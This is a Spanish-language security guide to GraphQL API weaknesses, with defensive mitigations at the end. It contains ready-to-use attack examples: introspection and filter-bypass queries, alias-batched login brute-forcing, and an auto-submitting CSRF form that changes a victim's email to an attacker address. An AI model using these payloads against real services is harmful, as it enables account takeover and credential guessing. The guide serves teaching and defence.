---
icon: folder-open
---

# GraphQL API vulnerabilities

### 🧬 ¿Qué es GraphQL?

**GraphQL** es un lenguaje de consultas para APIs desarrollado por Facebook en 2012 y liberado como open source en 2015.

A diferencia de REST (con múltiples endpoints como `/users`, `/posts`), GraphQL utiliza un único endpoint donde el cliente define exactamente qué datos quiere recibir.

#### 🧪 Ejemplo básico

```graphql
query {
    user(id: 1) {
        username
        email
    }
}
```

Respuesta:

```json
{
    "data": {
        "user": {
            "username": "admin",
            "email": "admin@example.com"
        }
    }
}
```

#### 🧠 Conceptos clave

* **Queries**: operaciones de lectura (equivalente a GET)
* **Mutations**: operaciones de escritura (POST/PUT/DELETE)
* **Schema**: define tipos, campos, queries y mutations
* **Introspection**: permite consultar el schema
* **Resolvers**: funciones backend que devuelven los datos

***

### ⚠️ Por qué GraphQL es vulnerable

La flexibilidad de GraphQL introduce problemas de seguridad:

#### 💥 Exposición de información

* Introspection permite ver todo el schema
* Se pueden descubrir campos ocultos (passwords, tokens)
* Mensajes de error revelan estructura interna

#### 🔓 Problemas de control de acceso

* Falta de autorización a nivel de campo
* Queries anidadas pueden saltarse controles
* Mutations sin validación de permisos

#### 💣 Ataques de fuerza bruta

* Aliasing permite múltiples intentos en una sola petición
* Rate limiting suele ser por request, no por operación
* Queries en lote evitan protecciones clásicas

***

### 🔍 Ataques de Introspection

Introspection permite descubrir toda la API.

#### 🧪 Query completa

```graphql
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        types {
            name
            fields {
                name
                type {
                    name
                    kind
                }
            }
        }
    }
}
```

#### 🧪 Versión simplificada

```graphql
{
    __schema {
        queryType {
            fields {
                name
                args {
                    name
                    type { name }
                }
            }
        }
    }
}
```

#### 🎯 Qué obtiene un atacante

* Queries y mutations disponibles
* Tipos y campos (incluyendo ocultos)
* Tipos de entrada y parámetros
* Relaciones entre objetos

#### 🕵️‍♂️ Query universal (detección)

```graphql
query { __typename }
```

Si responde:

```json
{"data":{"__typename":"Query"}}
```

→ Es un endpoint GraphQL.

***

### 🌐 Descubrimiento de endpoints

No siempre están en `/graphql`.

#### 📍 Rutas comunes

* `/graphql`
* `/graphql/v1`
* `/api`
* `/api/graphql`
* `/v1/graphql`

#### 🔍 Técnicas

* Probar rutas comunes
* Buscar respuestas tipo:
  * "Query not present"
  * "Must provide query string"
* Usar `query{__typename}`
* Revisar archivos JavaScript
* Buscar `application/graphql` en tráfico

***

### 🧠 Bypass de restricciones de introspection

#### 💥 Bypass con salto de línea

```graphql
query { __schema%0a{ queryType { name } } }
```

Algunos filtros solo detectan `__schema{`, no `__schema\n{`.

#### 🔄 Alternativa con \_\_type

```graphql
{
    __type(name: "Query") {
        fields {
            name
        }
    }
}
```

#### 🔍 Sugerencias

* Algunos servidores sugieren campos válidos
* Enviar nombres mal escritos para descubrirlos

***

### 💣 Fuerza bruta con aliasing

GraphQL permite alias:

```graphql
mutation {
    attempt1: login(input: {username: "carlos", password: "123456"}) {
        success
    }
    attempt2: login(input: {username: "carlos", password: "password"}) {
        success
    }
}
```

#### ⚠️ Por qué funciona

* Cada alias es una operación independiente
* El rate limiting suele contar requests HTTP
* El servidor ejecuta todos los intentos

***

### 🌐 CSRF en GraphQL

Si acepta `application/x-www-form-urlencoded`, puede ser vulnerable:

#### 💣 Petición vulnerable

```http
POST /graphql
Content-Type: application/x-www-form-urlencoded

query=mutation...&variables={"input":{"email":"hacked@evil.com"}}
```

#### 🧪 PoC CSRF

```html
<form action="https://target.com/graphql/v1" method="POST">
  <input type="hidden" name="query" value="mutation changeEmail..." />
  <input type="hidden" name="variables" value='{"input":{"email":"pwned@hacker.com"}}' />
</form>
<script>document.forms[0].submit();</script>
```

#### 🎯 Requisitos para que funcione

* Aceptar `application/x-www-form-urlencoded`
* No validar tokens CSRF
* No requerir headers personalizados

***

### 🚨 Vulnerabilidades comunes

| Vulnerabilidad        | Ataque                    | Impacto              |
| --------------------- | ------------------------- | -------------------- |
| Introspection activo  | Query `__schema`          | Exposición de datos  |
| Sin auth por campo    | Acceso a campos sensibles | Brecha de datos      |
| Endpoints ocultos     | Fuzzing                   | Acceso completo      |
| Brute force con alias | Múltiples logins          | Bypass autenticación |
| CSRF                  | Mutations vía formulario  | Secuestro de cuenta  |
| Queries anidadas      | Profundidad excesiva      | DoS                  |
| Inyección             | SQL/NoSQL en resolvers    | RCE / fuga de datos  |

***

### 🛡️ Prevención y mitigación

#### 🚫 Desactivar introspection en producción

```javascript
const server = new ApolloServer({
    introspection: false
});
```

#### 🔐 Autorización a nivel de campo

```javascript
if (!context.user.isAdmin) {
    throw new Error("Unauthorized");
}
```

#### ⏱️ Rate limiting por operación

* Limitar número de queries
* Limitar aliases
* Controlar complejidad

#### 📡 Forzar Content-Type

* Solo aceptar `application/json`
* Rechazar formularios
* Usar headers personalizados

#### 🧱 Limitar profundidad y complejidad

```
maxDepth: 10
maxComplexity: 1000
```

#### 🧪 Validación de entrada

* Validar argumentos
* Usar queries parametrizadas
* Evitar filtrado de errores sensibles
